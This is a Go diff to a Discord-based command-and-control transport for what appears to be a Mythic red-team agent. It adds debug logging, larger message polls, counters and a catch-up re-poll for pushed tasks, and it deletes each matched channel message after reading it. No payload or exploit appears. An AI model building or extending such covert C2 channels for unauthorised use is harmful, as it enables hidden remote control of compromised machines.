@@ -406,14 +406,20 @@ func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []struct
 	var inboundSocks []structs.SocksMsg
 
 	// Process ALL returned messages — merge tasks from each
-	for _, responseMessage := range responseMessages {
+	for i, responseMessage := range responseMessages {
 		decryptedData, err := d.unwrapResponse(responseMessage, cfg.EncryptionKey)
 		if err != nil {
+			if d.Debug {
+				log.Printf("GetTasking: decrypt failed for message %d/%d: %v", i+1, len(responseMessages), err)
+			}
 			continue
 		}
 
 		var taskResponse map[string]interface{}
 		if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
+			if d.Debug {
+				log.Printf("GetTasking: JSON parse failed for message %d/%d: %v", i+1, len(responseMessages), err)
+			}
 			continue
 		}
 
@@ -480,6 +486,9 @@ func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []struct
 		}
 	}
 
+	if d.Debug {
+		log.Printf("GetTasking: processed %d messages, got %d tasks", len(responseMessages), len(tasks))
+	}
 	return tasks, inboundSocks, nil
 }
 
@@ -641,21 +650,30 @@ func (d *DiscordProfile) sendAndPollAll(mythicMessage, senderID string, cfg *sen
 	// Poll for responses matching our sender_id with to_server=false.
 	// Collect ALL matching messages — in push C2, both the get_tasking response
 	// and pushed task messages may be present simultaneously.
+	var totalFetched, totalParsed, totalSkipped int
 	for attempt := 0; attempt < d.MaxRetries; attempt++ {
 		time.Sleep(time.Duration(d.PollInterval) * time.Second)
 
-		messages, err := d.getMessages(cfg, 50)
+		messages, err := d.getMessages(cfg, 100) // Discord API max is 100
 		if err != nil {
-			log.Printf("poll error (attempt %d): %v", attempt+1, err)
+			if d.Debug {
+				log.Printf("poll error (attempt %d/%d): %v", attempt+1, d.MaxRetries, err)
+			}
 			continue
 		}
+		totalFetched += len(messages)
 
 		var matched []string
 		for _, msg := range messages {
 			respWrapper, err := d.parseDiscordMessage(msg, cfg)
 			if err != nil {
+				totalSkipped++
+				if d.Debug {
+					log.Printf("parse skip (attempt %d): msgID=%s err=%v", attempt+1, msg.ID, err)
+				}
 				continue
 			}
+			totalParsed++
 
 			if d.matchesAgent(respWrapper, clientID, senderID) {
 				d.deleteMessage(msg.ID, cfg)
@@ -664,11 +682,36 @@ func (d *DiscordProfile) sendAndPollAll(mythicMessage, senderID string, cfg *sen
 		}
 
 		if len(matched) > 0 {
+			if d.Debug {
+				log.Printf("poll matched %d messages (attempt %d, fetched=%d parsed=%d skipped=%d)",
+					len(matched), attempt+1, totalFetched, totalParsed, totalSkipped)
+			}
+			// Catch-up re-poll: in push C2, more tasks may have arrived while we
+			// were processing. Do one additional poll to collect any stragglers.
+			time.Sleep(time.Duration(d.PollInterval) * time.Second)
+			extraMsgs, err := d.getMessages(cfg, 100)
+			if err == nil {
+				for _, msg := range extraMsgs {
+					respWrapper, err := d.parseDiscordMessage(msg, cfg)
+					if err != nil {
+						continue
+					}
+					if d.matchesAgent(respWrapper, clientID, senderID) {
+						d.deleteMessage(msg.ID, cfg)
+						matched = append(matched, respWrapper.Message)
+					}
+				}
+			}
 			return matched, nil
 		}
 	}
 
-	return nil, fmt.Errorf("no response after %d polling attempts", d.MaxRetries)
+	if d.Debug {
+		log.Printf("poll timeout: %d attempts, fetched=%d parsed=%d skipped=%d",
+			d.MaxRetries, totalFetched, totalParsed, totalSkipped)
+	}
+	return nil, fmt.Errorf("no response after %d polling attempts (fetched=%d parsed=%d skipped=%d)",
+		d.MaxRetries, totalFetched, totalParsed, totalSkipped)
 }
 
 // parseDiscordMessage extracts a MythicMessageWrapper from a Discord message.
